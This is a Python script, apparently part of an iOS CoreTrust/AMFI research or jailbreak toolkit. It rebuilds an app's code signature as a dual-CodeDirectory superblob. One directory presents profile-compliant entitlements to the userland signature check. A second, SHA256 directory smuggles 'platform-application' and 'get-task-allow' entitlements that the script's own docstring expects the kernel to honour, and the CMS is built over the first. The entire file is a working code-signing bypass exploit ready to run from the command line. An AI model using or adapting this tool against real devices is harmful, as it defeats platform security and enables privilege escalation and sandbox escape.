#!/usr/bin/env python3
"""Dual-CodeDirectory superblob.

CD_A  (main, SHA1)   : profile-compliant entitlements (blob A)  -> what
                        libmis/SecStaticCode is expected to check
CD_B  (alt, SHA256)  : platform-application entitlements (blob B) -> what the
                        kernel/AMFI is expected to execute
CMS: real Apple-issued distribution cert, messageDigest over CD_A, Apple
hash-agility attributes (9.1/9.2) over CD_B.
"""
import sys, os, struct, hashlib, plistlib
sys.path.insert(0, '/tmp/opencode')
sys.path.insert(0, '/home/femboychik/asuka4scape/06_CORETRUST/cttest')
from ctsign import (find_lc, find_segment, superblob, build_cms, der_ent_value,
                    build_der_entitlements, profile_ents, make_ipa)
from cryptography import x509


def cd_build(code, sig_off, ident, team, hash_type, slots, exec_limit):
    hs = 20 if hash_type == 1 else 32
    h = hashlib.sha1 if hash_type == 1 else hashlib.sha256
    nslots = (sig_off + 0xfff) // 0x1000
    hashes = b''
    for i in range(nslots):
        hashes += h(code[i * 0x1000:min((i + 1) * 0x1000, sig_off)]).digest()
    ident_b = ident.encode() + b'\0'
    team_b = team.encode() + b'\0'
    ident_off = 0x58
    team_off = ident_off + len(ident_b)
    special_start = team_off + len(team_b)
    hash_off = special_start + 7 * hs
    special = bytearray(7 * hs)
    for idx, val in slots.items():
        i = int(idx)
        if 1 <= i <= 7:
            special[(7 - i) * hs:(8 - i) * hs] = val[:hs]
    hdr = struct.pack('>IIIIIIIII', 0xfade0c02, hash_off + len(hashes), 0x20400, 0,
                      hash_off, ident_off, 7, nslots, sig_off)
    hdr += struct.pack('>BBBB', hs, hash_type, 0, 12)
    hdr += struct.pack('>IIII', 0, 0, team_off, 0)
    hdr += struct.pack('>Q', 0)
    hdr += struct.pack('>QQQ', 0, exec_limit, 1)
    return hdr + ident_b + team_b + bytes(special) + hashes


def ent_pair(ents):
    xml = plistlib.dumps(ents, fmt=plistlib.FMT_XML, sort_keys=True)
    ent = struct.pack('>II', 0xfade7171, 8 + len(xml)) + xml
    der = build_der_entitlements(ents)
    derb = struct.pack('>II', 0xfade7172, 8 + len(der)) + der
    return ent, derb


def build(bundle, profile, key_path, cert_paths, out_ipa, evil):
    info = open(os.path.join(bundle, 'Info.plist'), 'rb').read()
    pl = plistlib.loads(info)
    ident = pl['CFBundleIdentifier']
    binp = os.path.join(bundle, pl['CFBundleExecutable'])
    d = bytearray(open(binp, 'rb').read())
    ppl = profile_ents(profile)
    team = ppl['TeamIdentifier'][0]
    good = ppl['Entitlements']
    bad = dict(good)
    bad.update(evil)

    entA, derA = ent_pair(good)
    entB, derB = ent_pair(bad)
    dup = os.environ.get('MM_DUP', '1') == '1'
    cms_over = os.environ.get('MM_CMS_OVER', 'A')
    lc = find_lc(d, 0x1d)
    old_off = struct.unpack_from('<I', d, lc + 8)[0] if lc is not None else len(d)
    base = bytearray(d[:old_off])
    sig_off = (len(base) + 15) & ~15
    base += b'\0' * (sig_off - len(base))
    cr = open(os.path.join(bundle, '_CodeSignature/CodeResources'), 'rb').read()
    text = find_segment(bytes(base), '__TEXT')
    exec_limit = struct.unpack_from('<Q', base, text + 48)[0] if text else 0x4000
    req = open('/tmp/opencode/blobs/2.blob', 'rb').read()

    key = __import__('cryptography.hazmat.primitives.serialization', fromlist=['x']).load_der_private_key(
        open(key_path, 'rb').read(), password=None)
    certs = [x509.load_der_x509_certificate(open(p, 'rb').read()) for p in cert_paths]

    def make(sb_len):
        pad = (sb_len + 0xfff) & ~0xfff
        b = bytearray(base)
        struct.pack_into('<II', b, lc + 8, sig_off, pad)
        le = find_segment(bytes(b), '__LINKEDIT')
        lefo = struct.unpack_from('<Q', b, le + 40)[0]
        lesz = sig_off + pad - lefo
        struct.pack_into('<Q', b, le + 32, (lesz + 0xfff) & ~0xfff)
        struct.pack_into('<Q', b, le + 48, lesz)
        code = bytes(b)
        slotsA = {1: hashlib.sha1(info).digest(), 2: hashlib.sha1(req).digest(),
                  3: hashlib.sha1(cr).digest(), 5: hashlib.sha1(entA).digest(),
                  7: hashlib.sha1(derA).digest()}
        slotsB = {1: hashlib.sha256(info).digest(), 2: hashlib.sha256(req).digest(),
                  3: hashlib.sha256(cr).digest(), 5: hashlib.sha256(entB).digest(),
                  7: hashlib.sha256(derB).digest()}
        cdA = cd_build(code, sig_off, ident, team, 1, slotsA, exec_limit)
        cdB = cd_build(code, sig_off, ident, team, 2, slotsB, exec_limit)
        return cdA, cdB, code, pad

    sb_len = 0
    for _ in range(12):
        cdA, cdB, code, pad = make(sb_len)
        signed_cd = cdA if cms_over == 'A' else cdB
        cms = build_cms(signed_cd, key, certs, message_digest=hashlib.sha256(signed_cd).digest(),
                        agility_digest=hashlib.sha256(cdB).digest())
        cmsb = struct.pack('>II', 0xfade0b01, 8 + len(cms)) + cms
        entries = [(0, cdA), (2, req), (5, entA), (7, derA), (0x1000, cdB), (0x10000, cmsb)]
        if dup:
            entries = [(0, cdA), (2, req), (5, entA), (5, entB), (7, derA), (7, derB),
                       (0x1000, cdB), (0x10000, cmsb)]
        sb = superblob(entries)
        if len(sb) == sb_len:
            break
        sb_len = len(sb)
    else:
        raise SystemExit('size did not converge')
    out = bytearray(code) + sb + b'\0' * (pad - len(sb))
    open(binp, 'wb').write(out)
    make_ipa(bundle, out_ipa)
    print('built', out_ipa, 'cdA', hashlib.sha1(cdA).hexdigest()[:12],
          'cdB', hashlib.sha256(cdB).hexdigest()[:12], 'sb', len(sb))


if __name__ == '__main__':
    bundle, profile, key, out = sys.argv[1:5]
    certs = sys.argv[5:]
    build(bundle, profile, key, certs, out,
          {'platform-application': True, 'get-task-allow': True})
